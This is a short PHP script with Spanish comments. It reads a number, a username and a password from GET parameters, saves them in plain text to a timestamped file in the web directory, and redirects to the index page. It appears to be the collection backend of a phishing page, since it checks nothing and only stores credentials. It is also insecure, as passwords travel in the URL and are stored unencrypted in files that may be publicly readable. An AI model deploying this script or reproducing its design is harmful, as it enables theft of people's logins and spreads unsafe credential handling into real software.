<?php
// Verificar si se han enviado los datos del formulario
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    // Capturar los datos del formulario
    $numero = $_GET["numero"];
    $usuario = $_GET["usuario"];
    $contra = $_GET["contra"];

    // Guardar los datos en un nuevo archivo
    $archivo_nombre = 'datos_' . date('Ymd_His') . '.txt'; // Nombre único basado en la fecha y hora actual
    $archivo = fopen($archivo_nombre, "w");
    fwrite($archivo, "Número: " . $numero . "\n");
    fwrite($archivo, "Usuario: " . $usuario . "\n");
    fwrite($archivo, "Contraseña: " . $contra . "\n");
    fclose($archivo);

    // Redirigir o mostrar un mensaje de éxito
    header("Location: index.html?enviado=true");
    exit;
}
?>
